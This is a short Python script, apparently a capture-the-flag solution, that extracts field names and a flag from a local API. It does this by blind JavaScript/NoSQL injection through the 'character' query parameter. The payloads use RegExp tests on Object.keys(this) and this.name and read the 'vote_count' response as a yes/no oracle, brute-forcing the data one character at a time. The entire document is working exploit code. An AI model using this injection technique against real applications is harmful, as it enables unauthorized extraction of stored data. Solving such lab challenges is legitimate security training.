import requests
import string
import urllib.parse

uri = 'http://localhost:10003/api.php?character='

chara = list(string.ascii_lowercase + string.digits)
chara += ['\\,', '\\s', "\\_"]

# cari field
payload = "' || new RegExp('^{}+', 'g').exec(Object.keys(this).toString()) && ''=='"

result = []
index = 0
while True:
    result += ['']
    for c in chara:
        result[index] = c
        r = requests.get(uri + urllib.parse.quote_plus(payload.format(''.join(result))))
        r = r.json()
        print(''.join(result).replace("\\", ""))
        if r['data']['vote_count'] > 0:
            print('benar', ''.join(result).replace("\\", ""))
            break
    index += 1

# cari flag
payload = "' || new RegExp('^JOINTS21\\{{{}.*\\}}', 'g').exec(this.name) && ''=='"
result = []
index = 0
while True:
    result += ['']
    for c in chara:
        result[index] = c
        r = requests.get(uri + urllib.parse.quote_plus(payload.format(''.join(result))))
        r = r.json()
        print(''.join(result).replace("\\", ""))
        if r['data']['vote_count'] > 0:
            print('flag', ''.join(result).replace("\\", ""))
            break
    index += 1